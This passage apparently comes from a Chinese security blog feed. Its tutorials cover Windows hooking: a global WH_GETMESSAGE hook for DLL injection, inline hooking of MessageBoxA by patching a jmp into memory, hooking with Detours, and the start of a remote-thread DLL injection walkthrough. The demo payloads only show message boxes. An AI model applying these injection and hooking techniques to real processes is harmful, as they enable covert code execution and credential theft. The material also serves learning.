class="hljs-params">(CDataExchange* pDX)</span></span><br><span class="hljs-function"></span>&#123;<br>CDialog::DoDataExchange(pDX);<br>&#125;<br><br>BEGIN_MESSAGE_MAP(CMFCKeyboardHookDlg, CDialog)<br>ON_WM_PAINT()<br>ON_WM_QUERYDRAGICON()<br>ON_BN_CLICKED(IDC_BUTTON2, &amp;CMFCKeyboardHookDlg::OnBnClickedButton2)<br>ON_BN_CLICKED(IDC_BUTTON1, &amp;CMFCKeyboardHookDlg::OnBnClickedButton1)<br>END_MESSAGE_MAP()<br><br><br><span class="hljs-comment">// CMFCKeyboardHookDlg 消息处理程序</span><br><br><span class="hljs-function">BOOL <span class="hljs-title">CMFCKeyboardHookDlg::OnInitDialog</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>CDialog::OnInitDialog();<br><br><span class="hljs-comment">// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动</span><br><span class="hljs-comment">//  执行此操作</span><br>SetIcon(m_hIcon, TRUE);<span class="hljs-comment">// 设置大图标</span><br>SetIcon(m_hIcon, FALSE);<span class="hljs-comment">// 设置小图标</span><br><br><span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> 在此添加额外的初始化代码</span><br><br><span class="hljs-keyword">return</span> TRUE;  <span class="hljs-comment">// 除非将焦点设置到控件，否则返回 TRUE</span><br>&#125;<br><br><span class="hljs-comment">// 如果向对话框添加最小化按钮，则需要下面的代码</span><br><span class="hljs-comment">//  来绘制该图标。  对于使用文档/视图模型的 MFC 应用程序，</span><br><span class="hljs-comment">//  这将由框架自动完成。</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">CMFCKeyboardHookDlg::OnPaint</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (IsIconic())<br>&#123;<br><span class="hljs-function">CPaintDC <span class="hljs-title">dc</span><span class="hljs-params">(<span class="hljs-keyword">this</span>)</span></span>; <span class="hljs-comment">// 用于绘制的设备上下文</span><br><br>SendMessage(WM_ICONERASEBKGND, <span class="hljs-keyword">reinterpret_cast</span>&lt;WPARAM&gt;(dc.GetSafeHdc()), <span class="hljs-number">0</span>);<br><br><span class="hljs-comment">// 使图标在工作区矩形中居中</span><br><span class="hljs-keyword">int</span> cxIcon = GetSystemMetrics(SM_CXICON);<br><span class="hljs-keyword">int</span> cyIcon = GetSystemMetrics(SM_CYICON);<br>CRect rect;<br>GetClientRect(&amp;rect);<br><span class="hljs-keyword">int</span> x = (rect.Width() - cxIcon + <span class="hljs-number">1</span>) / <span class="hljs-number">2</span>;<br><span class="hljs-keyword">int</span> y = (rect.Height() - cyIcon + <span class="hljs-number">1</span>) / <span class="hljs-number">2</span>;<br><br><span class="hljs-comment">// 绘制图标</span><br>dc.DrawIcon(x, y, m_hIcon);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>CDialog::OnPaint();<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//当用户拖动最小化窗口时系统调用此函数取得光标</span><br><span class="hljs-comment">//显示。</span><br><span class="hljs-function">HCURSOR <span class="hljs-title">CMFCKeyboardHookDlg::OnQueryDragIcon</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">static_cast</span>&lt;HCURSOR&gt;(m_hIcon);<br>&#125;<br><br><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">CMFCKeyboardHookDlg::OnBnClickedButton2</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> 在此添加控件通知处理程序代码</span><br>SetHookOn();<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">CMFCKeyboardHookDlg::OnBnClickedButton1</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> 在此添加控件通知处理程序代码</span><br>SetHookOff();<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="全局钩子DLL注入"><a href="#全局钩子DLL注入" class="headerlink" title="全局钩子DLL注入"></a>全局钩子DLL注入</h1><p>WH_GETMESSAGE：该钩子作用是监视被投递到消息队列的消息。也就是在调用GetMessage()或PeekMessage()函数时，函数从消息队列中获取一个消息后调用该钩子。</p><p>利用WH_GETMESSAGE可以将DLL文件注入到所有的基于消息机制的程序中，在需要DLL大范围注入到基于消息的进程中时可以使用这种方法</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;pch.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tchar.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> <span class="hljs-meta-keyword">warning</span>(disable:4996)</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> data_seg(<span class="hljs-meta-string">&quot;mydata&quot;</span>)</span><br>HHOOK g_Hook = <span class="hljs-literal">NULL</span>;    <span class="hljs-comment">//必须赋初值，否则微软编译器会把没有初始化的数据放到普通的未初始化数据段中</span><br>                        <span class="hljs-comment">//而不是放在shared中,从而导致多个进程之间的共享行为失败</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> data_seg()</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker,<span class="hljs-meta-string">&quot;/SECTION:mydata,RWS&quot;</span>)</span><br>    <br><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> __declspec(dllexport) <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">SetHookOn</span><span class="hljs-params">()</span></span>;<br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> __declspec(dllexport) <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">SetHookOff</span><span class="hljs-params">()</span></span>;<br><br>HINSTANCE g_hInst;<br><br><span class="hljs-function">LRESULT CALLBACK <span class="hljs-title">GetMessageProc</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">    <span class="hljs-keyword">int</span> nCode,</span></span><br><span class="hljs-function"><span class="hljs-params">    WPARAM wParam,</span></span><br><span class="hljs-function"><span class="hljs-params">    LPARAM lParam</span></span><br><span class="hljs-function"><span class="hljs-params">)</span></span><br><span class="hljs-function"></span>&#123;<br>    MessageBox(<span class="hljs-literal">NULL</span>, <span class="hljs-string">L&quot;Hooked&quot;</span>, <span class="hljs-string">L&quot;提示&quot;</span>, MB_ICONWARNING | MB_OKCANCEL);<br>    <span class="hljs-keyword">return</span> CallNextHookEx(g_Hook, nCode, wParam, lParam);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">SetHookOn</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    g_Hook=SetWindowsHookEx(WH_GETMESSAGE, GetMessageProc, g_hInst, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">SetHookOff</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    UnhookWindowsHookEx(g_Hook);<br>&#125;<br><br><br><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">( HMODULE hModule,</span></span><br><span class="hljs-function"><span class="hljs-params">                       DWORD  ul_reason_for_call,</span></span><br><span class="hljs-function"><span class="hljs-params">                       LPVOID lpReserved</span></span><br><span class="hljs-function"><span class="hljs-params">                     )</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>    &#123;<br>        g_hInst = hModule;<br><br>    &#125;<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Inline Hook(内联钩子)</title>
    <link href="/2021/02/03/Inline-Hook-%E5%86%85%E8%81%94%E9%92%A9%E5%AD%90/"/>
    <url>/2021/02/03/Inline-Hook-%E5%86%85%E8%81%94%E9%92%A9%E5%AD%90/</url>
    
    <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>API函数保存在操作系统的DLL文件中，在运行程序后程序会将API所在的DLL加载入进程中，当在程序中使用某个API函数时。这样程序就会像调用自己的函数一样调用API，大体过程如图1所示。</p><p><a href="https://imgbed.cn/preview?id=601a3f4ece6d400001750f38"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/8bdf51f1-8df9-416e-89f8-47845d1379aa.jpeg" alt="imgbed.cn图床"></a></p><p>图1 调用API函数的大体过程</p><p>从图1中可以看出，在进程中当EXE模块调用CreateFile()函数的时候，会去调用kernel32.dll模块中的CreateFile()函数，因为真正的CreateFile()函数的实现在kernel32.dll模块中。</p><p>CreateFile()是API函数，API函数也是由人编写的代码再编译而成的，也有其对应的二进制代码。既然是代码，那么就可以被修改。通过一种“野蛮”的方法来直接修改API函数在内存中的映像，从而对API函数进行HOOK。使用的方法是，直接使用汇编指令的jmp指令将其代码执行流程改变，进而执行我们的代码，这样就使原来的函数的流程改变了。执行完我们的流程以后，可以选择性地执行原来的函数，也可以不继续执行原来的函数。</p><p><strong>假设要对某进程的kernel32.dll的CreateFile()函数进行HOOK，首先需要在指定进程中的内存中找到CreateFile()函数的地址，然后修改CreateFile()函数的首地址的代码为jmpMyProc的指令。这样，当指定的进程调用CreateFile()函数时，就会首先跳转到我们的函数当中去执行流程，这样就完成了我们的HOOK了。</strong></p><p><a href="https://imgbed.cn/preview?id=601a3f4ece6d400001750f38"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/8bdf51f1-8df9-416e-89f8-47845d1379aa.jpeg" alt="imgbed.cn图床"></a></p><p>由于这种方法是在程序流程中直接进行嵌入jmp指令来改变流程的，所以就把它叫做Inline Hook。</p><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>Inline  Hook是在程序中嵌入了jmp指令然后跳转到我们的程序流程中继续执行的，jmp指令的用法是jmp  目的地址，减5是因为jmp xxxx指令机器码长5个字节</p><p><strong>jmp后的偏移量 =  目的地址  -   源地址   -  5</strong></p><p>目的地址：钩子函数地址  源地址：要HOOK的函数地址</p><p>梳理一下我们内联钩子的流程：</p><ul><li>构造jmp指令</li><li>在内存中找到想要HOOK的函数地址，并保存为HOOK位置处的前5个字节</li><li>将构造的跳转指令写入需要HOOK的位置</li><li>当HOOK位置被执行时会跳转到我们的执行流程</li><li>如果要继续原来的流程，那么取消HOOK，也就是还原被修改的字节</li><li>执行原来的流程</li><li>继续HOOK住原来的位置</li></ul><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>先封装一个CILHook类，</p><p>头文件CILHook.h</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> once</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tchar.h&gt;</span></span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CILHook</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>    CILHook();<br>    ~CILHook();<br><br>    <span class="hljs-function">BOOL <span class="hljs-title">Hook</span><span class="hljs-params">(LPCTSTR pszModuleName, LPCSTR pszFuncName, PROC pfnHookFunc)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">UnHook</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function">BOOL <span class="hljs-title">ReHook</span><span class="hljs-params">()</span></span>;<br><br><span class="hljs-keyword">private</span>:<br>    FARPROC m_pfnOrig;<br>    BYTE m_bOldBytes[<span class="hljs-number">5</span>];<br>    BYTE m_bNewBytes[<span class="hljs-number">5</span>];<span class="hljs-comment">//m_bNewBytes[0] = &#x27;\xe9&#x27;，为jmp的机器码，m_bNewBytes为jmp指令</span><br><br>&#125;;<br><br><br></code></pre></td></tr></table></figure><p>CILHook.cpp</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;CILHook.h&quot;</span></span><br><br>CILHook::CILHook()<br>&#123;<br>    m_pfnOrig = <span class="hljs-literal">NULL</span>;<br>    ZeroMemory(m_bNewBytes, <span class="hljs-number">5</span>);<br>    ZeroMemory(m_bOldBytes, <span class="hljs-number">5</span>);<br><br>&#125;<br><br>CILHook::~CILHook() &#123;<br>    UnHook();<br>&#125;<br><br><span class="hljs-comment">//本质就是把User32.dll中的MessageBox的地址换成钩子函数地址</span><br><span class="hljs-comment">//模块名 pszModuleName, 函数名 pszFuncName, 钩子函数 pfnHookFunc</span><br><span class="hljs-function">BOOL <span class="hljs-title">CILHook::Hook</span><span class="hljs-params">(LPCWSTR pszModuleName, LPCSTR pszFuncName, PROC pfnHookFunc)</span> </span>&#123;<br>    BOOL bRet = FALSE;<br>    <span class="hljs-comment">//获取指定模块中函数的地址，User32.dll中的MessageBox</span><br>    m_pfnOrig = GetProcAddress(GetModuleHandle(pszModuleName), pszFuncName);<br>    <span class="hljs-keyword">if</span> (m_pfnOrig != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-comment">//保存该地址处5个字节的内容到m_bOldBytes</span><br>        DWORD dwNum = <span class="hljs-number">0</span>;<br>        ReadProcessMemory(GetCurrentProcess(), (LPCVOID)m_pfnOrig, m_bOldBytes, <span class="hljs-number">5</span>, &amp;dwNum);<br><br>        m_bNewBytes[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;\xe9&#x27;</span>;<span class="hljs-comment">//jmp的机器码</span><br>        <span class="hljs-comment">//pfnhookfunc是HOOK后的目标地址，m_pfnOrig是原来的地址，5是指令长度</span><br>        *(DWORD*)(m_bNewBytes + <span class="hljs-number">1</span>) = (DWORD)pfnHookFunc - (DWORD)m_pfnOrig - <span class="hljs-number">5</span>;<br><br>        WriteProcessMemory(GetCurrentProcess(), (LPVOID)m_pfnOrig, m_bNewBytes, <span class="hljs-number">5</span>, &amp;dwNum);<br>        bRet = TRUE;<br>    &#125;<br>    <span class="hljs-keyword">return</span> bRet;<br>&#125;<br><br><span class="hljs-comment">//解除Hook</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">CILHook::UnHook</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    BOOL bRet = FALSE;<br>    <span class="hljs-keyword">if</span> (!m_pfnOrig != <span class="hljs-number">0</span>) &#123;<br>        DWORD dwNum = <span class="hljs-number">0</span>;<br>        WriteProcessMemory(GetCurrentProcess(), m_pfnOrig, m_bNewBytes, <span class="hljs-number">5</span>, &amp;dwNum);<br>        bRet = TRUE;<br>    &#125;<br>    <br>&#125;<br><span class="hljs-function">BOOL <span class="hljs-title">CILHook::ReHook</span><span class="hljs-params">()</span> </span>&#123;<br>    BOOL bRet = FALSE;<br>    <span class="hljs-keyword">if</span> (m_pfnOrig != <span class="hljs-number">0</span>) &#123;<br>        DWORD dwNum = <span class="hljs-number">0</span>;<br>        WriteProcessMemory(GetCurrentProcess(), (LPVOID)m_pfnOrig, m_bNewBytes, <span class="hljs-number">5</span>, &amp;dwNum);<br>        bRet = TRUE;<br>    &#125;<br>    <span class="hljs-keyword">return</span> bRet;<br>&#125;<br></code></pre></td></tr></table></figure><p>主程序代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;CILHook.h&quot;</span></span><br><br>CILHook MsgHook;<br><br><span class="hljs-comment">//钩子函数，弹出内容为HOOK的对话框</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> WINAPI <span class="hljs-title">MyMessageBoxW</span><span class="hljs-params">(HWND hWnd,LPCWSTR lpText,LPCWSTR lpCaption,UINT uType)</span> </span><br><span class="hljs-function"></span>&#123;<br>MsgHook.UnHook();<br>MessageBox(<span class="hljs-literal">NULL</span>, _T(<span class="hljs-string">&quot;Hook&quot;</span>), lpCaption, uType);<span class="hljs-comment">//钩子函数弹出Hook</span><br>MsgHook.ReHook();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//hook后的MessageBox</span><br>MsgHook.Hook(_T(<span class="hljs-string">&quot;User32.dll&quot;</span>), <span class="hljs-string">&quot;MessageBoxA&quot;</span>, (FARPROC)MyMessageBoxW);<br>MessageBox(<span class="hljs-literal">NULL</span>, _T(<span class="hljs-string">&quot;test&quot;</span>), _T(<span class="hljs-string">&quot;test&quot;</span>), MB_OK);<span class="hljs-comment">//如果成功，弹出的内容不是test而是Hook。</span><br>MsgHook.UnHook();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><p>在windows 10中测试失败，仍然执行正常的MessageBox函数，原因是windows 10操作系统中采用ASLR(地址随机化)，用公式计算出来的偏移地址是无效的，所以无法jmp到钩子函数执行。而且在多线程系统中，可能有某个线程就在这个时候调用了修改的系统函数，造成无法预期的结果。在windows 10中，可以使用微软的一个轻量级的开源库——detours来完成Hook。</p><p><a href="https://imgbed.cn/preview?id=601a3f7da9fca800016725f5"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/151bc3d1-e336-4f85-b428-f454eb681d39.png" alt="imgbed.cn图床"></a></p><h1 id="使用detours进行API-Hook"><a href="#使用detours进行API-Hook" class="headerlink" title="使用detours进行API Hook"></a>使用detours进行API Hook</h1><p>这里可以使用微软的一个轻量级的开源库来完成Hook。Detours是微软提供的一个开发库，使用它可以简单、高效、稳定地实现API HOOK的功能。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>在Visual Studio中选择<code>工具</code>-<code>&gt;NuGet包管理器</code>-&gt;<code>程序包管理器控制台</code></p><p>输入安装命令会自动安装Detours库：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">Install-<span class="hljs-keyword">Package</span> <span class="hljs-title">Detours</span><br></code></pre></td></tr></table></figure><p>导入代码如下：</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;detours.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment (lib,<span class="hljs-string">&quot;detours.lib&quot;</span>)</span><br></code></pre></td></tr></table></figure><h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;detours.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment (lib,<span class="hljs-meta-string">&quot;detours.lib&quot;</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-title">int</span> <span class="hljs-params">(WINAPI* OldMesssageBoxA)</span></span><br><span class="hljs-function"><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">    HWND hWnd,</span></span><br><span class="hljs-function"><span class="hljs-params">    LPCSTR lpText,</span></span><br><span class="hljs-function"><span class="hljs-params">    LPCSTR lpCaption,</span></span><br><span class="hljs-function"><span class="hljs-params">    UINT uType</span></span><br><span class="hljs-function"><span class="hljs-params">    )</span> </span>= MessageBoxA;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> WINAPI <span class="hljs-title">MyFunction0</span><span class="hljs-params">(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> OldMesssageBoxA(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Hooked&quot;</span>, <span class="hljs-string">&quot;Warning&quot;</span>, MB_OKCANCEL);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    DetourTransactionBegin();<br>    DetourUpdateThread(GetCurrentThread());<br>    DetourAttach(&amp;(PVOID&amp;)OldMesssageBoxA, MyFunction0);<br>    DetourTransactionCommit();<br><br>    MessageBox(<span class="hljs-literal">NULL</span>, _T(<span class="hljs-string">&quot;test&quot;</span>), _T(<span class="hljs-string">&quot;test&quot;</span>), MB_OK);<br><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="利用过程-1"><a href="#利用过程-1" class="headerlink" title="利用过程"></a>利用过程</h2><p>成功</p><p><a href="https://imgbed.cn/preview?id=601a3f75355f5d000181d33d"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/091be798-ec28-45b6-98ee-cd0af7262ba4.png" alt="imgbed.cn图床"></a></p><p>具体内容和利用可见</p><p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BB%8E%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%8F%90%E5%8F%96%E6%98%8E%E6%96%87%E5%87%AD%E6%8D%AE/">渗透技巧——从远程桌面客户端提取明文凭据</a></p><p><a href="https://idiotc4t.com/persistence/detous-inline-hook">Detours InLine Hook</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>远程线程注入DLL</title>
    <link href="/2021/02/02/%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5DLL/"/>
    <url>/2021/02/02/%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5DLL/</url>
    
    <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>在Windows操作系统中，每个进程的内存空间都是被隔离的，但是某些时候需要两个进程协调工作或者是跨进程操作。“远程线程”意思是跨进程，简单来说就是进程A在进程B中创建一个线程，这就叫远程线程。</p><p>DLL文件加载到进程的地址空间中，不会有进程名，隐蔽性较好，方法是强制让某进程加载DLL文件。只要有进程PID，先通过OpenProcess获取该进程句柄，再使用CreateRemoteThread。<strong>每个进程地址空间隔离，新创建的线程函数地址也应该在目的进程中，而不应该在本进程中，同样传递给线程函数的参数也应该在目的进程中，ThreadProc与LoadLibrary除了返回值以外基本相同，返回值的问题可以不考虑。直接把LoadLibrary函数作为线程函数创建到指定进程中。</strong></p><p>LoadLibrary函数在Kernerl32.dll这个系统dll中，而Kernerl32这个DLL文件在任何进程中的加载位置都相同，也就是说<strong>LoadLibrary函数的地址在任何进程中的地址都相同，因此只要在进程中获取LoadLibray函数地址后，该地址在目标进程中也可以用</strong>。使用WriteProcessMemory把要注入的DLL文件写入目标进程，该函数第二个参数需要用VirtualAllocEx在目标进程申请一块内存，然后写入dll文件路径</p><h2 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h2><p>原理：先获取进程句柄（OpenProcess）-&gt;在目标进程申请一块容纳dll文件路径名的内存（VirtualAllocEx）并写入dll路径名（WriteProcessMemory）-&gt;从Kernel32.dll中获取LoadLibraryA函数的地址(GetProcAddress函数)-&gt;在目标进程中创建一个线程（CreateRemoteThread），把线程函数地址(ThreadProc)替换为从Kernel32.dll中获取的LoadLibrary地址加载恶意dll</p><h2 id="调整进程权限"><a href="#调整进程权限" class="headerlink" 